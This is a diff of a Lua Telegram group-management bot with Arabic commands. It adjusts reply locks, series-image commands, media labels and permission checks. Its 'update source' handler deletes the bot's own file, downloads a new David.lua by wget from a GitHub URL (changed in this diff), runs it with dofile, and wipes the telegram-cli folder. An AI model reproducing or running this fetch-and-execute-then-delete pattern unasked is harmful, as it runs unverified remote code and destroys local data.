+https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MoviesDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source David     --
 if text == "تفعيل مسلسل" and Manager(msg) and SourceCh(msg) then
@@ -9305,20 +9268,15 @@ local DavidTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم
 riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
 DevRio:set(David..'Rio:Series:Rio'..msg.chat_id_,true)  
 end
-if text == "مسلسل" or text == "↫ مسلسل ᥀" and not DevRio:get(David..'Rio:Series:Rio'..msg.chat_id_) and SourceCh(msg) then
-data,res = https.request('https://ccccxcc.ml/David/Series.php')
-if res == 200 then
-photo = json:decode(data)
-if photo.Info == true then
-local Text ='*᥀︙تم اختيار مسلسل لك*'
-keyboard = {} 
-keyboard.inline_keyboard = {
+if text and (text == "مسلسل" or text == "↫ مسلسل ᥀") and not DevRio:get(David..'Rio:Series:Rio'..msg.chat_id_) and SourceCh(msg) then
+Rio = math.random(2,54); 
+local Text ='*᥀︙تم اختيار المسلسل لك*'
+keyboard = {}  
+keyboard.inline_keyboard = { 
 {{text = '᥀ David Team .',url="t.me/L9L9L"}},
-}
-local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo='..URL.escape(photo.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-end
-end
+} 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SeriesDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --     Source David     --
 if Admin(msg) then
@@ -9725,7 +9683,22 @@ DevRio:set(David.."Rio:Lock:Rd"..msg.chat_id_,"ok")
 return false  
 end
 end
-
+if text == "تفعيل اضف رد" and ChCheck(msg) or text == "تفعيل اضافه رد" and ChCheck(msg) then 
+if RioConstructor(msg) then
+local DavidTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل اضف رد'
+riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
+DevRio:del(David.."Rio:Lock:Rd"..msg.chat_id_)
+return false  
+end
+end
+if text == "تعطيل اضف رد" and ChCheck(msg) or text == "تعطيل اضافه رد" and ChCheck(msg) then 
+if RioConstructor(msg) then
+local DavidTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل اضف رد'
+riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DavidTeam, 14, string.len(msg.sender_user_id_))
+DevRio:set(David.."Rio:Lock:Rd"..msg.chat_id_,"ok")
+return false  
+end
+end
 --     Source David     --
 if text and text:match('^تفعيل$') and SudoBot(msg) and ChCheck(msg) then
 if ChatType ~= 'sp' then
@@ -10239,6 +10212,7 @@ Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذف
 return false
 end
 if text == 'اضف رد' and Manager(msg) and ChCheck(msg) then
+if not DevRio:get(David..'Rio:Lock:Rd'..msg.chat_id_) then
 DevRio:set(David..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
 Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
 return false
@@ -10257,7 +10231,7 @@ DevRio:set(David..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
 DevRio:sadd(David..'Rio:Manager:GpRed'..msg.chat_id_,text)
 DevRio:set(David..'DelManagerRep'..msg.chat_id_,text)
 return false
-end end
+end end end
 --     Source David     --
 if text == 'حذف رد عام' and SecondSudo(msg) and ChCheck(msg) or text == '↫ حذف رد عام ᥀' and SecondSudo(msg) and ChCheck(msg) or text == 'مسح رد عام' and SecondSudo(msg) and ChCheck(msg) or text == 'حذف رد للكل' and SecondSudo(msg) and ChCheck(msg) or text == 'مسح رد للكل' and SecondSudo(msg) and ChCheck(msg) or text == 'مسح رد مطور' and SecondSudo(msg) and ChCheck(msg) or text == 'حذف رد مطور' and SecondSudo(msg) and ChCheck(msg) then
 local List = DevRio:smembers(David.."Rio:Sudo:AllRed")
@@ -10881,7 +10855,7 @@ if SecondSudo(msg) then
 if text == "تحديث السورس" and SourceCh(msg) or text == "تحديث سورس" and SourceCh(msg) or text == "↫ تحديث السورس ᥀" and SourceCh(msg) then 
 Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙جاري تحديث سورس ديفد', 1, 'md') 
 os.execute('rm -rf David.lua') 
-os.execute('wget https://raw.githubusercontent.com/David-Team-Rio/David/master/David.lua') 
+os.execute('wget https://raw.githubusercontent.com/DavidTeam8/David/master/David.lua') 
 dofile('David.lua') 
 io.popen("rm -rf ../.telegram-cli/*")
 print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
@@ -11098,7 +11072,7 @@ DevRio:setex(David.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300,
 local text = '᥀︙حسنا ارسل كليشة الاشتراك الجديده'  
 Dev_Rio(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
 end
-if text == "حذف كليشه الاشتراك الاجباري" and ChCheck(msg) or text == "↫ حذف كليشه الاشتراك ᥀" and ChCheck(msg) then  
+if text == "حذف كليشه الاشتراك الاجباري" or text == "↫ حذف كليشه الاشتراك ᥀" then  
 if not SecondSudo(msg) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
 else
@@ -11106,7 +11080,7 @@ DevRio:del(David..'Rio:ChText')
 textt = "᥀︙تم حذف كليشة الاشتراك الاجباري"
 Dev_Rio(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
 end end
-if text == 'كليشه الاشتراك' and ChCheck(msg) or text == 'جلب كليشه الاشتراك' and ChCheck(msg) or text == '↫ كليشه الاشتراك ᥀' and ChCheck(msg) then
+if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' or text == '↫ كليشه الاشتراك ᥀' then
 if not SecondSudo(msg) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
 else
@@ -11153,7 +11127,7 @@ keyboard.inline_keyboard = {
 {{text = '᥀ مبرمج السورس',url="t.me/tsttt"}},
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/W55555&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/FFFGF&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
 --     Source David     --
@@ -11189,6 +11163,9 @@ if DevRio:get(David..'Rio:Lock:EditMsgs'..msg.chat_id_) and not Text and not Sec
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 Media = 'الميديا'
 if result.content_.ID == "MessagePhoto" then Media = 'الصوره'
+elseif result.content_.ID == "MessageSticker" then Media = 'الملصق'
+elseif result.content_.ID == "MessageVoice" then Media = 'البصمه'
+elseif result.content_.ID == "MessageAudio" then Media = 'الصوت'
 elseif result.content_.ID == "MessageVideo" then Media = 'الفيديو'
 elseif result.content_.ID == "MessageAnimation" then Media = 'المتحركه'
 end
